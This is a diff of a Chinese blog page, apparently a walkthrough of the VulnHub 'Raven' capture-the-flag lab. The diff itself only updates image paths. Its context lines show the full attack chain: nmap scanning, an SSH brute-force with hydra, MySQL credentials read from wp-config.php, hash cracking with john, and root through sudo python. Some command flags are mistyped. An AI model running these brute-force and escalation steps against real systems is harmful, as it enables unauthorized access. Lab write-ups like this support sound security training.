@@ -17,22 +17,22 @@
 <meta property="og:site_name" content="zhou">
 <meta property="og:description" content="一、端口扫描">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://blog.zyp0422.mom/Raven/Raven/1.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/Raven/Raven/2.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/Raven/Raven/3.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/Raven/Raven/4.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/Raven/Raven/5.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/Raven/Raven/6.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/Raven/Raven/7.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/Raven/Raven/9.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/Raven/Raven/8.png">
-<meta property="og:image" content="https://blog.zyp0422.mom/Raven/Raven/10.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/Raven/1.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/Raven/2.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/Raven/3.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/Raven/4.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/Raven/5.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/Raven/6.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/Raven/7.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/Raven/9.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/Raven/8.png">
+<meta property="og:image" content="https://blog.zyp0422.mom/Raven/10.png">
 <meta property="article:published_time" content="2024-06-11T15:47:09.000Z">
-<meta property="article:modified_time" content="2024-09-09T06:47:12.823Z">
+<meta property="article:modified_time" content="2024-09-07T11:17:59.529Z">
 <meta property="article:author" content="zhoupeng">
 <meta property="article:tag" content="VulnHub靶场">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://blog.zyp0422.mom/Raven/Raven/1.png">
+<meta name="twitter:image" content="https://blog.zyp0422.mom/Raven/1.png">
   
     <link rel="alternative" href="/atom.xml" title="zhou" type="application/atom+xml">
   
@@ -112,7 +112,7 @@
 			</ul>
 		</nav>
                                 <nav>
-    			总文章数 38
+    			总文章数 39
 		</nav>
 		<nav class="header-smart-menu">
 			
@@ -401,46 +401,46 @@
 
 <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">sudo</span> <span class="selector-tag">nmap</span> <span class="selector-tag">-A</span> <span class="selector-tag">-sS</span> <span class="selector-tag">-T4</span> <span class="selector-tag">-p-</span> <span class="number">192.168</span><span class="selector-class">.91</span><span class="selector-class">.191</span>（目标<span class="selector-tag">IP</span>）</span><br></pre></td></tr></table></figure>
 
-<p><img src="/Raven/Raven/1.png"></p>
+<p><img src="/Raven/1.png"></p>
 <p>发现开放了22，80等端口</p>
 <h3 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h3><p>1.访问网站，没发现扫描，查看网页源代码，在网站主页源代码发现了下面的内容</p>
 <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="selector-tag">--you</span> <span class="selector-tag">will</span> <span class="selector-tag">probably</span> <span class="selector-tag">use</span> <span class="selector-tag">both</span> <span class="selector-tag">of</span> <span class="selector-tag">these</span> <span class="selector-tag">usernames</span><span class="selector-class">.Believe</span> <span class="selector-tag">me</span>!!!<span class="selector-tag">--</span>&gt;</span><br><span class="line">&lt;!<span class="selector-tag">--username</span>:<span class="selector-tag">michael</span> <span class="selector-tag">--</span>!&gt;</span><br><span class="line">&lt;!<span class="selector-tag">--username</span>:<span class="selector-tag">steven</span> <span class="selector-tag">--</span>!&gt;</span><br></pre></td></tr></table></figure>
 
 <p>可以·看出存在两个用户，且前面端口扫描的时候22端口开放，这里可以猜测以下是否就是ssh连接的用户，且更大胆一点是否一个是普通用户，一个是管理员</p>
 <p>2.继续查看网页源代码，在service.html里面发现了flag1</p>
-<p><img src="/Raven/Raven/2.png"></p>
+<p><img src="/Raven/2.png"></p>
 <p>3.再往下就没有发现什么了，前面猜测ssh，用hydra爆破以下密码试试</p>
 <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">hydra</span> <span class="selector-tag">-1</span> <span class="selector-tag">michael</span> <span class="selector-tag">-P</span> /<span class="selector-tag">usr</span>/<span class="selector-tag">share</span>/<span class="selector-tag">wordlists</span>/<span class="selector-tag">rockyou</span><span class="selector-class">.txt</span> <span class="selector-tag">ssh</span>:<span class="comment">//192.168.91.60 -f</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/Raven/Raven/3.png"></p>
+<p><img src="/Raven/3.png"></p>
 <p>从图片看出来ssh连接的用户michael，密码michael</p>
 <p>4.ssh连接michael</p>
 <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ssh</span> <span class="selector-tag">michael</span>@<span class="number">192.168</span><span class="selector-class">.91</span><span class="selector-class">.60</span></span><br><span class="line"><span class="selector-tag">michael</span></span><br></pre></td></tr></table></figure>
 
 <p>5.基础信息收集</p>
 <p>在网站根目录发现flag2.txt</p>
-<p><img src="/Raven/Raven/4.png"></p>
+<p><img src="/Raven/4.png"></p>
 <p>在html目录里发现了wordpress，且在里面发现了wp-config.php，查看发现数据库密码</p>
-<p><img src="/Raven/Raven/5.png"></p>
+<p><img src="/Raven/5.png"></p>
 <p>6.连接数据库获取信息</p>
 <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">mysql</span> <span class="selector-tag">-uroot</span> <span class="selector-tag">-p</span></span><br><span class="line"><span class="selector-tag">R</span>@<span class="selector-tag">v3nSecurity</span></span><br></pre></td></tr></table></figure>
 
 <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 查询数据库</span><br><span class="line"><span class="selector-tag">show</span> <span class="selector-tag">databases</span>;</span><br><span class="line"></span><br><span class="line"># 使用数据库，查询数据表</span><br><span class="line"><span class="selector-tag">use</span> <span class="selector-tag">wordpress</span></span><br><span class="line"><span class="selector-tag">show</span> <span class="selector-tag">tables</span>;</span><br><span class="line"></span><br><span class="line"># 发现<span class="selector-tag">flag3</span></span><br><span class="line"><span class="selector-tag">select</span> * <span class="selector-tag">from</span> <span class="selector-tag">flag3</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/Raven/Raven/6.png"></p>
+<p><img src="/Raven/6.png"></p>
 <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查询<span class="selector-tag">wp_users</span>，发现<span class="selector-tag">hash</span>后的<span class="selector-tag">steven</span>密码</span><br><span class="line"><span class="selector-tag">select</span> * <span class="selector-tag">from</span> <span class="selector-tag">wp_users</span>;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/Raven/Raven/7.png"></p>
+<p><img src="/Raven/7.png"></p>
 <p>将密码保存成txt文件，使用jhon对照rcokyou.txt来解密，得到密码为pink84</p>
 <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">john</span> <span class="selector-tag">--user</span>=/<span class="selector-tag">usr</span>/<span class="selector-tag">share</span>/<span class="selector-tag">wordlists</span>/<span class="selector-tag">rockyou</span><span class="selector-class">.txt</span> <span class="selector-tag">test</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/Raven/Raven/9.png"></p>
+<p><img src="/Raven/9.png"></p>
 <h3 id="三、提权"><a href="#三、提权" class="headerlink" title="三、提权"></a>三、提权</h3><p>1.登录steven，使用以下命令提权</p>
 <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">sudo</span> <span class="selector-tag">python</span> <span class="selector-tag">-c</span> &quot;<span class="selector-tag">import</span> <span class="selector-tag">pty</span>;<span class="selector-tag">pty</span><span class="selector-class">.spawn</span>(<span class="string">&#x27;/bin/bash&#x27;</span>)&quot;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/Raven/Raven/8.png"></p>
+<p><img src="/Raven/8.png"></p>
 <p>2.在root里面找到了flag4</p>
-<p><img src="/Raven/Raven/10.png"></p>
+<p><img src="/Raven/10.png"></p>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
 <li>hydra爆破ssh登录密码</li>
 <li>John爆破密码</li>
